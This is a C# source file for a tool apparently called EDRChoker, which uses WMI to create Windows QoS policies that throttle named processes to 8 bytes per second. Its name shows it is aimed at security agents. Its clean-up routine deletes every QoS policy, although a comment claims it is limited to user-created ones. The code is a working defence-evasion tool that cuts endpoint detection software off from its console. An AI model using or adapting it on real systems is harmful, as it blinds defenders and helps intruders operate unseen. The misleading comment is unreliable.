using System;
using System.Management;
using System.IO;
using EDRChoker;

namespace QosPolicyExample
{
    class Program
    {
        static void Main(string[] args)
        {
            Utils utils = new Utils();
            utils.ShowBanner();
            // Verify Administrative permissions
            if (!utils.IsRunningAsAdmin())
            {
                Console.WriteLine("ERROR: Elevated privileges required.");
                return;
            }
            if (args.Length > 0)
            {
                utils.ReadCleanFile(args[0]);
                if (utils.procName.Length == 0)
                {
                    Console.WriteLine("No valid process names found in the file.");
                    return;
                }
                foreach (string proc in utils.procName)
                {
                    Console.WriteLine($"THROTTLING! Process: {proc}");
                    CreateThrottleCurlPolicyPureWmi(proc);
                }
            }
            else
            {
                //clear
                Console.WriteLine("DO CLEAR...\n");
                RemoveAllThrottleCurlPoliciesPureWmi();
            }

            //end main
        }

        


        static void CreateThrottleCurlPolicyPureWmi(string procName)
        {
            try
            {
                var scope = new ManagementScope(@"\\.\ROOT\StandardCimv2");
                scope.Connect();

                var managementPath = new ManagementPath("MSFT_NetQosPolicySettingData");
                var policyClass = new ManagementClass(scope, managementPath, null);

                // Construct a raw, detached memory object mapping the exact schema fields
                ManagementObject newPolicy = policyClass.CreateInstance();

                newPolicy["Owner"] = 1;

                string guid = Guid.NewGuid().ToString();
                string policyName = Path.GetRandomFileName().Replace(".", "").Substring(0, 8);
                newPolicy["Name"] = policyName;

                // Use this to force the policy to be treated as a new, unique instance in the active store without conflicts
                // this will apply the policy directly to the active store. Affect immediately
                newPolicy["InstanceID"] = $"{guid}\\{policyName}\\ActiveStore";

                newPolicy["AppPathNameMatchCondition"] = procName;
                newPolicy["IPProtocolMatchCondition"] = 3U;      // 3 = Both TCP/UDP (uint32)
                newPolicy["NetworkProfile"] = 0U;               // 0 = All profiles (uint32)

                // 3. Throttle Actions (Matching your exact MOF structure: uint64 in Bytes per second)
                // 8 Bits/sec
                newPolicy["ThrottleRateAction"] = 8UL;

                var putOptions = new PutOptions
                {
                    Type = PutType.CreateOnly
                };

                newPolicy.Put(putOptions);
                Console.WriteLine($"SUCCESS! Policy {policyName} registered");
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"   Message   : {ex.Message}");
                Console.WriteLine($"   ErrorCode : {ex.ErrorCode}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\nUnexpected error: {ex.Message}");
            }
        }
        //
        static void RemoveAllThrottleCurlPoliciesPureWmi()
        {
            try
            {
                var scope = new ManagementScope(@"\\.\ROOT\StandardCimv2");
                scope.Connect();

                // Query only user-created policies (Owner = 1) to protect system defaults
                var query = new ObjectQuery("SELECT * FROM MSFT_NetQosPolicySettingData");

                using (var searcher = new ManagementObjectSearcher(scope, query))
                using (var queryCollection = searcher.Get())
                {
                    if (queryCollection.Count == 0)
                    {
                        Console.WriteLine("No custom QoS policies found to remove.");
                        return;
                    }

                    foreach (ManagementObject policy in queryCollection)
                    {
                        string policyName = policy["Name"]?.ToString() ?? "Unknown";
                        Console.WriteLine($"REMOVING... {policyName}");
                        // Delete the instance from the WMI repository
                        policy.Delete();

                        Console.WriteLine($"REMOVED! {policyName}");
                    }
                }
            }
            catch (ManagementException ex)
            {
                Console.WriteLine($"WMI Error: {ex.Message}");
                Console.WriteLine($"ErrorCode: {ex.ErrorCode}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Unexpected error: {ex.Message}");
            }
        }

        //

    }
}
